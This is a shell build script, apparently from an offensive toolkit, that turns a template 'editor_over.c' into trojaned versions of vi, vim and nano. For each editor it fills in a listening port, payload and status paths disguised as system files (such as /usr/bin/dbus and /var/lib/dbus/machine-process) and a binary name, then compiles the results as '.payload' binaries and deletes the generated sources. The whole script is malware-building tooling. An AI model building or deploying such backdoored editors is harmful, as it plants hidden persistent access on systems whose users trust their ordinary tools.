#VI
VI_STATUS="/var/lib/vim/vi-process"
VI_PAYLOAD="/usr/bin/dvi"
VI_ERROR="/var/lib/vim/vi-err"
VI_BINARYNAME="qvr"
VI_EDITOR="/usr/bin/vi"
VI_PORT="5004"

#VIM
VIM_STATUS="/var/lib/vim/process"
VIM_PAYLOAD="/usr/bin/vuxf"
VIM_ERROR="/var/lib/vim/err"
VIM_BINARYNAME="vux"
VIM_EDITOR="/usr/bin/vim"
VIM_PORT="5005"

#NANO
NANO_STATUS="/var/lib/dbus/machine-process"
NANO_PAYLOAD="/usr/bin/dbus"
NANO_ERROR="/var/lib/dbus/err"
NANO_BINARYNAME="idb"
NANO_EDITOR="/usr/bin/nano"
NANO_PORT="5006"

#Copy files
cp editor_over.c vi.c
cp editor_over.c vim.c
cp editor_over.c nano.c

#Replace DEFINE strings with variables
#VI
sed -i "s#{STATUS}#$VI_STATUS#" vi.c
sed -i "s#{PAYLOAD}#$VI_PAYLOAD#" vi.c
sed -i "s#{ERROR}#$VI_ERROR#" vi.c
sed -i "s#{BINARYNAME}#$VI_BINARYNAME#" vi.c
sed -i "s#{EDITOR}#$VI_EDITOR#" vi.c
sed -i "s#6969#$VI_PORT#" vi.c

#VIM
sed -i "s#{STATUS}#$VIM_STATUS#" vim.c
sed -i "s#{PAYLOAD}#$VIM_PAYLOAD#" vim.c
sed -i "s#{ERROR}#$VIM_ERROR#" vim.c
sed -i "s#{BINARYNAME}#$VIM_BINARYNAME#" vim.c
sed -i "s#{EDITOR}#$VIM_EDITOR#" vim.c
sed -i "s#6969#$VIM_PORT#" vim.c

#NANO
sed -i "s#{STATUS}#$NANO_STATUS#" nano.c
sed -i "s#{PAYLOAD}#$NANO_PAYLOAD#" nano.c
sed -i "s#{ERROR}#$NANO_ERROR#" nano.c
sed -i "s#{BINARYNAME}#$NANO_BINARYNAME#" nano.c
sed -i "s#{EDITOR}#$NANO_EDITOR#" nano.c
sed -i "s#6969#$NANO_PORT#" nano.c

#Compile binaries
gcc vi.c -o vi.payload
gcc vim.c -o vim.payload
gcc nano.c -o nano.payload

#Remove c files
rm vi.c
rm vim.c
rm nano.c